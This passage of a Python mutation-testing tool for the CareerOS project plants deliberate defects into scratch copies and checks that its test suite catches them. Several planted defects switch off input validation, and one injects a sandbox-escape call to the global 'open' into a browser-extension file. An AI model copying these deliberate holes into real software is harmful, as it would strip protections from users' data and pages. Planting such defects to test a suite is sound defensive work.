     "answers: a long answer's own text not read, as before Codex Pass 2"),
    ('careeros/review/answers.py',
     '    if len(value) > ANSWER_FILL_CHARS:',
     '    if False:', 'answers: a long answer filled by the extension'),
    ('careeros/review/answers.py',
     '    if len(value) > ANSWER_FILL_CHARS:',
     '    if len(canonical(value)) > ANSWER_FILL_CHARS:', 'answers: the fill limit counting only the text as the checks read it'),
    ('careeros/review/answers.py',
     '    odd = next((ch for ch in value if not fill_char(ch)), None)',
     '    odd = None', 'answers: a line break, invisible character or other script filled'),
    ('careeros/review/answers.py',
     '    if html.unescape(value) != value:',
     '    if False:', 'answers: an HTML entity filled'),
    ('careeros/review/answers.py',
     '    letters = unicodedata.normalize("NFD", ch)',
     '    letters = unicodedata.normalize("NFKD", ch)', 'answers: a letter read through a compatibility fold filled'),
    ('careeros/review/answers.py',
     '    if " " <= ch <= "~" or ch in _FILL_MARKS:',
     '    if ch.isprintable():', 'answers: any printable character filled'),
    ('careeros/review/answers.py',
     '    forms = {normalize(text), _trim(canonical(text, _BLANK_AS_SPACE)), _trim(canonical(text, entities=False))}',
     '    forms = {normalize(text), _trim(canonical(text, _BLANK_AS_SPACE))}', 'answers: a word an HTML entity hides read only decoded'),
    ('careeros/review/adapters.py',
     '        why = answer_lib.not_fillable(entry["answer"])   # prose, or characters the checks can\'t read as the page will',
     '        why = None', 'adapters: a value CareerOS cannot fill handed to the extension'),
    # A stopped or slept-through run resumes (2026-10-23), reviewed twice (6259a92, d606387): what carries over, what
    # runs again, and what stops a run
    ('tools/mutate.py',
     ('        if record.get("mutation") == MUTATIONS['
      'index][3] and record.get("result") == "CAUGHT" \\'),
     '        if record.get("mutation") == MUTATIONS[index][3] \\', "mutate: a stopped run's result other than CAUGHT carried over"),
    ('tools/mutate.py',
     ('                and not record.get("slept") an'
      'd 0 < (record.get("seconds") or 0) <= slowest:'),
     '                and 0 < (record.get("seconds") or 0) <= slowest:', 'mutate: a catch the machine slept through carried over'),
    ('tools/mutate.py',
     ('        digest.update(rel.enco'
      'de("utf-8") + b"\\0" + content)'),
     '        digest.update(rel.encode("utf-8"))', 'mutate: results carried over to changed code'),
    ('tools/mutate.py',
     ('            again = [job for job in '
      'jobs if results[job[0]].get("slept")]'),
     '            again = []', 'mutate: a defect the machine slept through not run again'),
    ('tools/mutate.py',
     ('            results[job'
      '[0]]["result"] = "SLEPT"'),
     '            pass', 'mutate: a defect still slept through counted as caught'),
    ('tools/mutate.py',
     ('        return max(0.0, kernel.GetTic'
      'kCount64() / 1000 - awake.value / 1e7)'),
     '        return 0.0', 'mutate: time asleep never read on Windows'),
    ('tools/mutate.py',
     ('    if slept > '
      'SLEEP_TOLERANCE:'),
     '    if False:', 'mutate: a sleep during a defect not marked'),
    ('tools/mutate.py',
     ('    before = clock()\n    outcome = one(r'
      'elative, source, old, new, key["tree"])\n'),
     '    outcome = one(relative, source, old, new, key["tree"])\n    before = clock()\n', 'mutate: the sleep clock read only after the defect ran'),
    ('tools/mutate.py',
     ('    changed = "infrastructure" not in outc'
      'ome and outcome.get("tree") != key["tree"]'),
     '    changed = False', 'mutate: a result from a changed tree kept'),
    ('tools/mutate.py',
     ('        raise (TreeChanged if chan'
      'ged else EnvironmentChanged)(label)'),
     '        return index, record', 'mutate: a changed tree or environment does not stop the run'),
    ('tools/mutate.py',
     ('            return {**suite(copy,'
      ' MUTATION_TIMEOUT), "tree": tree}'),
     '            return suite(copy, MUTATION_TIMEOUT)', "mutate: a scratch copy's tree not reported"),
    ('tools/mutate.py',
     ('            return {**suite(copy,'
      ' MUTATION_TIMEOUT), "tree": tree}'),
     '            return {**suite(copy, MUTATION_TIMEOUT), "tree": tree_digest(copy)}', 'mutate: a scratch copy hashed after the defect went in'),
    ('tools/mutate.py',
     ('        digest.update(rel.enco'
      'de("utf-8") + b"\\0" + content)'),
     '        digest.update(content)', 'mutate: a renamed file leaves the tree hash unchanged'),
    ('tools/mutate.py',
     ('    return {"tree": tree, "env": hashlib.sha256(json.d'
      'umps(env, sort_keys=True).encode("utf-8")).hexdigest()}'),
     '    return {"tree": tree, "env": "any"}', 'mutate: results carried over to another environment'),
    ('tools/mutate.py',
     ('/ f"careeros-mutation-progress-{key['
      '\'tree\'][:12]}-{key[\'env\'][:8]}.jsonl"'),
     '/ f"careeros-mutation-progress-{key[\'tree\'][:12]}.jsonl"', 'mutate: one progress file for every environment'),
    ('tools/mutate.py',
     ('            same = entry.get("tree") == key'
      '["tree"] and entry.get("env") == key["env"]'),
     '            same = True', 'mutate: a progress line from another tree or environment carried over'),
    ('tools/mutate.py',
     ('                and not record.get("slept") an'
      'd 0 < (record.get("seconds") or 0) <= slowest:'),
     '                and not record.get("slept") and (record.get("seconds") or 0) <= slowest:', 'mutate: a result with no time carried over'),
    ('tools/mutate.py',
     ('                if o'
      'ut.read(1) != b"\\n":'),
     '                if False:', 'mutate: a progress line written onto the end of a cut-short one'),
    ('tools/mutate.py',
     ('                msvcrt.locking(ha'
      'ndle.fileno(), msvcrt.LK_NBLCK, 1)'),
     '                pass', 'mutate: two runs on one tree at once'),
    ('tools/mutate.py',
     ('    if (Path(tempfile.gettemp'
      'dir()) / STOP_FILE).exists():'),
     '    if False:', 'mutate: a stop request ignored'),
    ('tools/mutate.py',
     ('    if tree_digest() != tree o'
      'r in_copy.get("tree") != tree:'),
     '    if False:', 'mutate: a change during the baselines not noticed'),
    ('tools/mutate.py',
     ('    awake = (in_copy.get("s'
      'econds") or 0) - copy_slept'),
     '    awake = in_copy.get("seconds") or 0', 'mutate: a sleep during the copy baseline loosens the time limit'),
    ('tools/mutate.py',
     ('    slowest = RESUME_S'
      'LOWEST * max(awake, 60)'),
     '    slowest = float("inf")', 'mutate: no time limit on carrying over'),
    ('tools/mutate.py',
     ('        if index in kept:\n            result'
      's[index] = kept[index]\n            continue\n'),
     '        if False:\n            results[index] = kept[index]\n            continue\n', 'mutate: defects carried over run again anyway'),
    ('tools/mutate.py',
     ('"carried_over": len(kep'
      't), "reruns_after_sleep"'),
     '"carried_over": 0, "reruns_after_sleep"', 'mutate: the receipt hides results carried over'),
    ('tools/mutate.py',
     ('    if caught != len(res'
      'ults):\n        return 1\n'),
     '    if caught != len(results):\n        progress.unlink(missing_ok=True)\n        return 1\n', 'mutate: progress deleted before every defect is caught'),
    ('tools/mutate.py',
     ('            again = [job for job in '
      'jobs if results[job[0]].get("slept")]'),
     '            again = [job for job in jobs if results[job[0]]["result"] != "CAUGHT"]', 'mutate: a survivor run again until it is caught'),
    ('tools/validate.py',
     '    listing = done.stdout.split("\\nnot caught:\\n", 1)[-1]',
     '    listing = done.stdout', "validate: each attempt's line listed instead of each defect's final result"),
    ('tools/mutate.py',
     ('    moved = not changed and run_key(ke'
      'y["tree"], env())["env"] != key["env"]'),
     '    moved = False', 'mutate: an environment change during a run not noticed'),
    ('tools/mutate.py',
     ('    if halt is not No'
      'ne and halt.is_set():'),
     '    if False:', 'mutate: defects keep starting after the run had to stop'),
    ('tools/mutate.py',
     ('        if halt is not Non'
      'e:\n            halt.set()\n'),
     '        if False:\n            halt.set()\n', 'mutate: a stopped run does not stop the other workers'),
    ('tools/mutate.py',
     ('            if expected is n'
      'ot None and tree != expected:'),
     '            if False:', 'mutate: a copy known to be changed still runs its suite'),
    ('tools/mutate.py',
     ('            if '
      'text != source:'),
     '            if False:', 'mutate: a defect planted into text the run never hashed'),
    ('tools/mutate.py',
     ('            tree = tree_digest(copy)'
      '\n            text = (copy / relative)'),
     '            tree = tree_digest()\n            text = (copy / relative)', 'mutate: the live folder hashed instead of the scratch copy'),
    ('tools/mutate.py',
     ('    if tree_digest() != tree o'
      'r in_copy.get("tree") != tree:'),
     '    if tree_digest() != tree:', "mutate: the copy baseline's copy not checked"),
    ('tools/mutate.py',
     ('        if stop.stat().'
      'st_mtime < started - 2:'),
     '        if True:', 'mutate: a stop request made while the baselines ran ignored'),
    ('tools/mutate.py',
     ('        if stop.stat().'
      'st_mtime < started - 2:'),
     '        if False:', 'mutate: a stop request left from an earlier run stops the next'),
    ('tools/mutate.py',
     ('            version = subprocess.run([node, "--version"], capt'
      'ure_output=True, text=True, timeout=60).stdout.strip() or None'),
     '            version = None', 'mutate: the Node.js version left out of the environment'),
    ('tools/mutate.py',
     ('            "packages": hashlib.sha256("\\n".jo'
      'in(packages).encode("utf-8")).hexdigest()[:16],'),
     '            "packages": "",', 'mutate: installed packages left out of the environment'),
    ('tools/mutate.py',
     ('    slowest = RESUME_S'
      'LOWEST * max(awake, 60)'),
     '    slowest = RESUME_SLOWEST * awake', 'mutate: no floor under the carry-over time limit'),
    ('tools/mutate.py',
     ('"node": node and os.path.nor'
      'mcase(os.path.realpath(node))'),
     '"node": node', 'mutate: a different spelling of the same Node.js path starts from zero'),
    ('tools/mutate.py',
     ('    return ([f"added {rel}" for rel in'
      ' sorted(after.keys() - before.keys())]'),
     '    return ([]', 'mutate: a file added during a run not named'),
    ('tools/validate.py',
     '    if done.returncode in (2, 3):',
     '    if False:', 'validate: why a run stopped is hidden'),
    # Codex Pass 3 (0c907ec) and a fresh check of its fix: sources and the defect list read against the accepted tree,
    # and a last look before any receipt
    ('tools/mutate.py',
     ('        if hashlib.sha256(raw'
      ').digest() != files[relative]:'),
     '        if False:', 'mutate: a source read without checking it against the tree the run accepted'),
    ('tools/mutate.py',
     ('        source = raw.decode("utf-8").re'
      'place("\\r\\n", "\\n").replace("\\r", "\\n")'),
     '        source = raw.decode("utf-8")', 'mutate: a source read with its line endings, so it is not the text a copy holds'),
    ('tools/mutate.py',
     ('        if relative not in'
      ' files:\n            print('),
     '        if False:\n            print(', 'mutate: a defect file the tree does not hold, as spelled, read anyway'),
    ('tools/mutate.py',
     ('        if relative not in file'
      's:\n            problems.append('),
     '        if False:\n            problems.append(', 'mutate: a defect file the tree does not hold, as spelled, passes the anchor check'),
    ('tools/mutate.py',
     ('    changes = tree_changes(files, now) i'
      'f tree_digest(files=now) != tree else []'),
     '    changes = []', 'mutate: no last look at the tree before a receipt'),
    ('tools/mutate.py',
     ('    moved = run_key(tree, envi'
      'ronment())["env"] != key["env"]'),
     '    moved = False', 'mutate: no last look at the environment before a receipt'),
    ('tools/mutate.py',
     ('    drift = defect'
      '_list_drift(files)'),
     '    drift = None', 'mutate: a defect list saved at startup runs and is certified'),
    ('tools/mutate.py',
     ('    if hashlib.sha256(raw).'
      'digest() != files.get(rel):'),
     '    if False:', "mutate: the tool's own file not checked against the tree it accepted"),
    ('tools/mutate.py',
     ('    if [tuple(m) for m in listed]'
      ' != [tuple(m) for m in MUTATIONS]:'),
     '    if False:', 'mutate: the defect list in the tree not compared with the one loaded'),
    # The read-only check of the Codex package text (2026-10-22): a global reached through the middle of a ? :
    ('extension/fill.js',
     '  const now = Date.now();\n',
     '  const now = Date.now();\n  try { (here ? open : 0).call(null, "https://boards.greenhouse.io"); } catch (e) { result.refused = ""; }\n',
     'extension: a global reached through the middle of a ? :'),
]


def suite(folder: Path, timeout: float | None = None) -> dict:
    """Run the whole suite in `folder` and read unittest's own summary: tests run, failures, errors, skips, which tests
    failed, and whether any test module failed to import (unittest's _FailedTest). Never raises on a timeout."""
    started = time.monotonic()
    try:
        done = subprocess.run([sys.executable, "-m", "unittest", "discover", "-s", "tests", "-t", "."], cwd=folder,
                              capture_output=True, text=True, encoding="utf-8", errors="replace", timeout=timeout)
    except subprocess.TimeoutExpired:
        return {"exit": None, "timed_out": True, "seconds": round(time.monotonic() - started, 1)}
    text = done.stderr + done.stdout
    ran = re.search(r"^Ran (\d+) tests? in", text, re.M)
    counts = {k: int(v) for k, v in re.findall(r"(failures|errors|skipped|expected failures|unexpected successes)=(\d+)", text)}
    failing = re.findall(r"^(?:FAIL|ERROR): (\S+) \(([^)]*)\)", text, re.M)
    load = [name for name, where in failing if "_FailedTest" in where]
    return {"exit": done.returncode, "timed_out": False, "seconds": round(time.monotonic() - started, 1),
            "ran": int(ran.group(1)) if ran else None, "failures": counts.get("failures", 0), "errors": counts.get("errors", 0),
            "skipped": counts.get("skipped", 0), "load_errors": len(load),
            "failing": [where for _, where in failing if "_FailedTest" not in where][:3]}


def run_tests(folder: Path) -> int:
    """The suite's exit code, for callers that need only pass or fail (a timeout counts as a failure)."""
    outcome = suite(folder)
    return 1 if outcome["exit"] is None else outcome["exit"]


def classify(outcome: dict, baseline_ran: int | None) -> str:
    """CAUGHT only when a real test failed or errored with the whole suite loaded. A module that failed to import, a
    suite that ran fewer tests than the baseline, a timeout or an unreadable run is NOT proof the defect was caught."""
    if outcome.get("timed_out"):
        return "TIMEOUT"
    if outcome["exit"] == 0:
        return "SURVIVED"
    if outcome.get("ran") is None:
        return "INFRA_ERROR"
    if outcome["load_errors"] or (baseline_ran is not None and outcome["ran"] < baseline_ran):
        return "LOAD_ERROR"
    return "CAUGHT" if outcome["failing"] or outcome["failures"] or outcome["errors"] else "INFRA_ERROR"


# What a scratch copy leaves out. evidence/ stays in: the documents name its files and a test reads one (until
# 2026-10-14 it was left out, so those tests failed in every copy and every mutation looked caught). Tool caches and
# editor or system clutter stay out (2026-10-23): no test reads them, and one appearing during a run would otherwise
# stop it or change the tree a stopped run resumes on.
COPY_IGNORE = (".venv*", "__pycache__", ".git", ".mypy_cache", ".ruff_cache", ".pytest_cache", ".vscode", ".idea",
               "Thumbs.db", "desktop.ini", ".DS_Store")
MUTATION_TIMEOUT = 30 * 60   # seconds for one mutated suite; a hang is reported as TIMEOUT, never as caught


def _copy(dest: Path) -> None:
    shutil.copytree(ROOT, dest, ignore=shutil.ignore_patterns(*COPY_IGNORE))


def copy_outcome() -> dict:
    """The unmutated suite in a scratch copy made exactly like a mutation's; it must pass, otherwise a failure caused by
    the copy itself would make every mutation look caught. The copy's tree comes back with the result."""
    with tempfile.TemporaryDirectory() as tmp:
        copy = Path(tmp) / "engine"
        _copy(copy)
        tree = tree_digest(copy)
        return {**suite(copy, MUTATION_TIMEOUT), "tree": tree}


def copy_passes() -> bool:
    return copy_outcome()["exit"] == 0


# A run that is stopped or slept through picks up where it left off (2026-10-23: two six-hour runs were lost to a laptop
# that slept). Each finished defect is kept in a progress file named after the tree and the environment it ran in; the
# next run on exactly that tree, in the same environment, carries over the defects CAUGHT in a normal time without a
# sleep, and runs the rest. A defect the machine slept through is run again within the same run: the stall, not the
# defect, may have failed a test. Every result is checked against a hash of its own scratch copy, and the environment
# is read again after each defect, so a change during a run is never kept as a result for what the run started on
# (reviews of 6259a92 and d606387).
RESUME_SLOWEST = 5        # a defect slower than this many copy baselines (each at least 60 s) runs again, never carried
SLEEP_TOLERANCE = 5.0     # seconds asleep during one defect before it counts as slept through
SLEEP_ROUNDS = 3          # times a slept-through defect runs again before it is SLEPT
STOP_FILE = "careeros-mutation.stop"   # create it in the temp folder to stop every run on this machine; each resumes
TREE_CHANGED = "TREE_CHANGED"
ENV_CHANGED = "ENV_CHANGED"


class RunStopped(Exception):
    """A run stopped before its receipt; the defects already finished stay in the progress file."""


class TreeChanged(RunStopped):
    """A defect's scratch copy did not match the tree the run started on: the folder changed during the run."""


class EnvironmentChanged(RunStopped):
    """The interpreter, its packages or Node.js changed during the run."""


class StopRequested(RunStopped):
    """The operator asked the run to stop (STOP_FILE)."""


class Halted(RunStopped):
    """Another defect stopped the run; this one never started."""


class RunInProgress(Exception):
    """Another run holds this tree's progress file."""


def asleep_seconds() -> float:
    """Seconds this machine has spent asleep since it booted, or 0 where that can't be read."""
    if sys.platform == "win32":
        import ctypes
        kernel = ctypes.windll.kernel32
        kernel.GetTickCount64.restype = ctypes.c_ulonglong
        awake = ctypes.c_ulonglong()
        kernel.QueryUnbiasedInterruptTime(ctypes.byref(awake))
        return max(0.0, kernel.GetTickCount64() / 1000 - awake.value / 1e7)
    if hasattr(time, "CLOCK_BOOTTIME"):
        return max(0.0, time.clock_gettime(time.CLOCK_BOOTTIME) - time.clock_gettime(time.CLOCK_MONOTONIC))
    return 0.0


def tree_files(root: Path | None = None) -> dict[str, bytes]:
    """Every file a scratch copy of `root` (by default the repository) holds, git-ignored ones included, except the
    receipt a run writes: its path and the SHA-256 of its content."""
    root = root or ROOT
    files: dict[str, bytes] = {}
    for folder, dirs, names in os.walk(root):
        dirs[:] = [d for d in dirs if not any(fnmatch.fnmatch(d, pattern) for pattern in COPY_IGNORE)]
        for name in names:
            path = Path(folder) / name
            rel = path.relative_to(root).as_posix()
            if rel == "evidence/mutation-receipt.json" or any(fnmatch.fnmatch(name, pattern) for pattern in COPY_IGNORE):
                continue
            files[rel] = hashlib.sha256(path.read_bytes()).digest()
    return files


def tree_digest(root: Path | None = None, files: dict[str, bytes] | None = None) -> str:
    """SHA-256 of a tree's files by path and content: results carry over only to exactly this code, these tests and
    these fixtures."""
    digest = hashlib.sha256()
    for rel, content in sorted((tree_files(root) if files is None else files).items()):
        digest.update(rel.encode("utf-8") + b"\0" + content)
    return digest.hexdigest()


def tree_changes(before: dict[str, bytes], after: dict[str, bytes]) -> list[str]:
    """What differs between two trees, for the operator: added, removed and changed paths."""
    return ([f"added {rel}" for rel in sorted(after.keys() - before.keys())]
            + [f"removed {rel}" for rel in sorted(before.keys() - after.keys())]
            + [f"changed {rel}" for rel in sorted(before.keys() & after.keys()) if before[rel] != after[rel]])


def environment() -> dict:
    """What outside the tree decides how the suite runs: the interpreter, its installed packages and the Node.js runtime
    the extension behaviour tests use (paths as the system resolves them). Results carry over only within the same
    environment, and a run stops if it changes."""
    from importlib import metadata
    node = os.environ.get("CAREEROS_NODE") or shutil.which("node")
    version = None
    if node:
        try:
            version = subprocess.run([node, "--version"], capture_output=True, text=True, timeout=60).stdout.strip() or None
        except (OSError, subprocess.SubprocessError):
            version = None
    packages = sorted(f"{dist.metadata['Name']}=={dist.version}" for dist in metadata.distributions())
    return {"python": sys.version, "executable": os.path.normcase(os.path.realpath(sys.executable)), "platform": sys.platform,
            "packages": hashlib.sha256("\n".join(packages).encode("utf-8")).hexdigest()[:16],
            "node": node and os.path.normcase(os.path.realpath(node)), "node_version": version}


def run_key(tree: str, env: dict) -> dict:
    """What a result is valid for: this tree, in this environment (hashed: the receipt never holds local paths)."""
    return {"tree": tree, "env": hashlib.sha256(json.dumps(env, sort_keys=True).encode("utf-8")).hexdigest()}


def progress_path(key: dict) -> Path:
    """Where a run on this tree, in this environment, keeps its finished defects."""
    return Path(tempfile.gettempdir()) / f"careeros-mutation-progress-{key['tree'][:12]}-{key['env'][:8]}.jsonl"


def carried_over(path: Path, slowest: float, key: dict) -> dict[int, dict]:
    """The defects a stopped run on this tree, in this environment, already CAUGHT: each the same defect, in a normal
    time and without a sleep (the last line for a defect decides); everything else runs again."""
    kept: dict[int, dict] = {}
    if not path.exists():
        return kept
    for line in path.read_bytes().splitlines():
        try:
            entry = json.loads(line)
            index, record = entry["index"], entry["result"]
            same = entry.get("tree") == key["tree"] and entry.get("env") == key["env"]
        except (ValueError, KeyError, TypeError, AttributeError):
            continue   # a line cut short when the run stopped, or bytes that are no line at all
        if not (same and isinstance(index, int) and 0 <= index < len(MUTATIONS) and isinstance(record, dict)):
            continue
        if record.get("mutation") == MUTATIONS[index][3] and record.get("result") == "CAUGHT" \
                and not record.get("slept") and 0 < (record.get("seconds") or 0) <= slowest:
            kept[index] = {**record, "carried_over": True}
        else:
            kept.pop(index, None)
    return kept


def append_progress(path: Path, entry: dict) -> None:
    """Add one finished defect to the progress file, on a line of its own even after a line a power loss cut short. A
    failure to write costs only the resume (that defect runs again next time), never the run."""
    try:
        with path.open("a+b") as out:
            end = out.seek(0, os.SEEK_END)
            if end:
                out.seek(end - 1)
                if out.read(1) != b"\n":
                    out.write(b"\n")
            out.write(json.dumps(entry).encode("utf-8") + b"\n")
    except OSError as exc:
        print(f"progress not saved ({type(exc).__name__}: {exc}); this defect runs again if the run is resumed", flush=True)


@contextlib.contextmanager
def only_run(path: Path) -> Iterator[None]:
    """Hold an operating-system lock beside this tree's progress file for the whole run, so two runs never share it; the
    system releases the lock when the process ends, however it ends."""
    handle = path.with_suffix(".lock").open("a+b")
    try:
        try:
            if sys.platform == "win32":
                import msvcrt
                handle.seek(0)
                msvcrt.locking(handle.fileno(), msvcrt.LK_NBLCK, 1)
            else:
                import fcntl
                fcntl.flock(handle.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
        except OSError as exc:
            raise RunInProgress(str(path.with_suffix(".lock"))) from exc
        yield
    finally:
        handle.close()


def _now() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


def run_one(job: tuple, baseline_ran: int | None, key: dict, progress: Path, lock: threading.Lock,
            one: Callable[..., dict] | None = None, clock: Callable[[], float] | None = None,
            env: Callable[[], dict] | None = None, halt: threading.Event | None = None) -> tuple[int, dict]:
    """Run one planted defect in its own scratch copy and record it. The sleep clock is read just before and just after,
    so a sleep anywhere in between marks the defect slept. A result from a copy whose tree isn't the run's, or with the
    environment changed by the time it finished, is never recorded: it stops the run, and no other defect starts."""
    one, clock, env = one or _one, clock or asleep_seconds, env or environment
    index, relative, source, old, new, label = job
    if halt is not None and halt.is_set():
        raise Halted(label)
    if (Path(tempfile.gettempdir()) / STOP_FILE).exists():
        raise StopRequested(label)
    before = clock()
    outcome = one(relative, source, old, new, key["tree"])
    slept = round(clock() - before, 1)
    changed = "infrastructure" not in outcome and outcome.get("tree") != key["tree"]
    moved = not changed and run_key(key["tree"], env())["env"] != key["env"]
    result = TREE_CHANGED if changed else ENV_CHANGED if moved else classify(outcome, baseline_ran)
    record = {"mutation": label, "file": relative, "result": result, "at": _now(),
              **{k: outcome.get(k) for k in ("ran", "failures", "errors", "skipped", "load_errors", "failing", "seconds",
                                             "infrastructure") if outcome.get(k) not in (None, [], 0) or k == "ran"}}
    if slept > SLEEP_TOLERANCE:
        record["slept"] = slept
    print(f"{result:8}  {label}" + (f"  (the machine slept {record['slept']} s)" if "slept" in record else ""), flush=True)
    if changed or moved:
        if halt is not None:
            halt.set()
        raise (TreeChanged if changed else EnvironmentChanged)(label)
    with lock:
        append_progress(progress, {"index": index, **key, "result": record})
    return index, record


def run_jobs(jobs: list, run: Callable[[tuple], tuple[int, dict]], workers: int, results: list) -> int:
    """Run every job, then again any the machine slept through (up to SLEEP_ROUNDS more times). One still slept through
    is SLEPT, never caught: run the command again and it resumes. Returns how many re-runs that took."""
    reruns = 0
    with ThreadPoolExecutor(max_workers=max(1, workers)) as pool:
        for index, result in pool.map(run, jobs):
            results[index] = result
        for round_ in range(1, SLEEP_ROUNDS + 1):
            again = [job for job in jobs if results[job[0]].get("slept")]
            if not again:
                break
            print(f"running again {len(again)} defects the machine slept through (round {round_} of {SLEEP_ROUNDS})", flush=True)
            reruns += len(again)
            for index, result in pool.map(run, again):
                results[index] = result
    for job in jobs:
        if results[job[0]].get("slept"):
            results[job[0]]["result"] = "SLEPT"
    return reruns


def _one(relative: str, source: str, old: str, new: str, expected: str | None = None) -> dict:
    """Apply one mutation to its own scratch copy of the engine and run the whole suite there. The copy is hashed before
    the mutation goes in, and the mutation is made in the copy's own text, which must be the text the run read; a copy
    that isn't the `expected` tree never runs its suite."""
    try:
        with tempfile.TemporaryDirectory() as tmp:
            copy = Path(tmp) / "engine"
            _copy(copy)
            tree = tree_digest(copy)
            text = (copy / relative).read_text(encoding="utf-8")
            if text != source:
                tree = f"{relative} differs from the text the run read"
            if expected is not None and tree != expected:
                return {"exit": None, "timed_out": False, "ran": None, "tree": tree}
            (copy / relative).write_text(text.replace(old, new), encoding="utf-8")
            return {**suite(copy, MUTATION_TIMEOUT), "tree": tree}
    except OSError as exc:   # the copy itself failed: infrastructure, never a catch
        return {"exit": None, "timed_out": False, "ran": None, "infrastructure": f"{type(exc).__name__}: {exc}"[:200]}


def anchor_problems() -> list[str]:
    """Every planted defect's text must occur exactly once in its file; otherwise that defect never runs (2026-10-17: five
    went stale after R2 and R5 rewrote their code). Checked on every quick validation, not only in a full run. Its file
    must also be one the tree holds, spelled as the tree spells it (a full run reads it against the tree's hash)."""
    problems = []
    files = tree_files()
    for relative, old, _new, label in MUTATIONS:
        if relative not in files:
            problems.append(f"{label} ({relative}: not a file of the tree as spelled; check its case and COPY_IGNORE)")
            continue
        path = ROOT / relative
        count = path.read_text(encoding="utf-8").count(old) if path.exists() else 0
        if count != 1:
            problems.append(f"{label} ({relative}: found {count} times)")
    return problems


def defect_list_drift(files: dict[str, bytes]) -> str | None:
    """Why the defect list this process loaded is not the one in the tree it accepted, or None. A save of this file between
    Python reading it and the tree's hash would otherwise run one list and certify another (a fresh check of the Codex
    Pass 3 fix). The list is read back from the very bytes the tree hashed."""
    here, root = Path(__file__).resolve(), ROOT.resolve()
    if not here.is_relative_to(root):
        return None   # the tool run against another tree (the tests)
    rel = here.relative_to(root).as_posix()
    raw = here.read_bytes()
    if hashlib.sha256(raw).digest() != files.get(rel):
        return f"{rel} changed after the tree was hashed"
    module = ast.parse(raw.decode("utf-8"))
    listed = next(ast.literal_eval(node.value) for node in module.body if isinstance(node, ast.Assign)
                  and any(getattr(target, "id", None) == "MUTATIONS" for target in node.targets))
    if [tuple(m) for m in listed] != [tuple(m) for m in MUTATIONS]:
        return f"the defect list in {rel} is not the one this process loaded"
    return None


def main(argv=None) -> int:
    import argparse
    started = time.time()
    parser = argparse.ArgumentParser(description="CareerOS mutation check")
    parser.add_argument("--workers", type=int, default=1, help="mutations tested in parallel (each in its own copy)")
    parser.add_argument("--check-anchors", action="store_true", help="only check that every defect's text is found once")
    parser.add_argument("--fresh", action="store_true", help="start from zero: discard what a stopped run on this tree left")
    args = parser.parse_args(argv)
    if args.check_anchors:
        problems = anchor_problems()
        print("\n".join(problems) or f"all {len(MUTATIONS)} planted-defect anchors found once")
        return 1 if problems else 0
    env = environment()
    node = env["node"]
    if not node:   # the behaviour tests skip, so the extension defects only they catch would survive
        print("no Node.js runtime (set CAREEROS_NODE): the extension behaviour tests won't run", flush=True)
    files = tree_files()
    tree = tree_digest(files=files)
    drift = defect_list_drift(files)
    if drift:
        print(f"{drift}: run again once nothing is editing it")
        return 2
    baseline = suite(ROOT, MUTATION_TIMEOUT)
    if baseline["exit"] != 0:
        print(f"baseline tests fail ({baseline}); fix them before running mutations")
        return 2
    asleep = asleep_seconds()
    in_copy = copy_outcome()
    copy_slept = round(asleep_seconds() - asleep, 1)
    if in_copy["exit"] != 0 or in_copy["ran"] != baseline["ran"]:
        print(f"the unmutated suite fails in a scratch copy ({in_copy}); fix the copy before running mutations")
        return 2
    if tree_digest() != tree or in_copy.get("tree") != tree:
        print("the repository changed while the baselines ran (" + ("; ".join(tree_changes(files, tree_files())[:10])
              or "changed and changed back") + "); run again once nothing is editing it")
        return 2
    print(f"baseline: {baseline['ran']} tests, {baseline['skipped']} skipped, OK in the repository and in a scratch copy", flush=True)
    key = run_key(tree, env)
    progress = progress_path(key)
    try:
        with only_run(progress):
            code = _run(args, started, files, env, key, progress, baseline, in_copy, copy_slept)
    except RunInProgress as exc:
        print(f"another run on this tree holds its progress ({exc}); let it finish, or stop it first")
        return 2
    if code == 0:
        try:
            progress.with_suffix(".lock").unlink(missing_ok=True)
        except OSError:
            pass   # an empty file; only the lock held on it ever mattered
    return code


def _run(args, started: float, files: dict, env: dict, key: dict, progress: Path, baseline: dict, in_copy: dict,
         copy_slept: float) -> int:
    tree = key["tree"]
    stop = Path(tempfile.gettempdir()) / STOP_FILE
    try:
        if stop.stat().st_mtime < started - 2:   # file times trail the precise clock by up to a timer tick
            stop.unlink()   # left from before this run started: it was meant for an earlier one
        else:
            stop.unlink(missing_ok=True)
            print(f"\nstopped on request before any defect ran ({stop.name} appeared while the baselines ran)")
            return 3
    except FileNotFoundError:
        pass
    if args.fresh:
        progress.unlink(missing_ok=True)
    awake = (in_copy.get("seconds") or 0) - copy_slept   # the copy baseline's own time, without a sleep in it
    slowest = RESUME_SLOWEST * max(awake, 60)
    kept = carried_over(progress, slowest, key)
    print(f"progress file {progress}: " + (f"{len(kept)} defects already CAUGHT on this tree carried over" if kept
                                           else "nothing to carry over") + f"; to stop it and resume later, create {stop}", flush=True)
    others = sorted(p.name for p in progress.parent.glob(f"careeros-mutation-progress-{tree[:12]}-*.jsonl") if p != progress)
    if not kept and others:
        print(f"progress from this tree in another environment ({', '.join(others)}) does not carry over: Python, its"
              " packages or Node.js differ", flush=True)
    results: list = [None] * len(MUTATIONS)   # every slot is filled below or by run_jobs
    sources, jobs = {}, []
    for index, (relative, old, new, label) in enumerate(MUTATIONS):
        if relative not in files:
            print(f"\n{relative} (planted defect '{label}') is not a file of the tree as spelled: check its case and"
                  " COPY_IGNORE (tools/mutate.py --check-anchors lists every such defect)")
            return 2
        raw = (ROOT / relative).read_bytes()
        # the file as the run accepted it (Codex Pass 3: with every defect carried over no copy is made, so an edit after
        # the baselines' check reached the receipt): otherwise the run stops before anything is recorded
        if hashlib.sha256(raw).digest() != files[relative]:
            print(f"\nthe repository changed after the baselines' check ({relative}); stopped, nothing recorded. Put back"
                  " exactly what the run started on and run it again: what finished before carries over.")
            return 2
        source = raw.decode("utf-8").replace("\r\n", "\n").replace("\r", "\n")   # as read_text reads it
        sources[relative] = hashlib.sha256(source.encode("utf-8")).hexdigest()
        if source.count(old) != 1:
            results[index] = {"mutation": label, "file": relative, "result": "ANCHOR_NOT_FOUND"}
            continue
        if index in kept:
            results[index] = kept[index]
            continue
        jobs.append((index, relative, source, old, new, label))
    lock, halt = threading.Lock(), threading.Event()
    try:
        reruns = run_jobs(jobs, lambda job: run_one(job, baseline["ran"], key, progress, lock, halt=halt), args.workers, results)
    except TreeChanged as exc:
        print(f"\nthe repository changed during the run (first seen with: {exc}); stopped, and nothing from the changed copies"
              " was kept. Differences from the start, now: " + ("; ".join(tree_changes(files, tree_files())[:10])
                                                                 or "none (changed and changed back)")
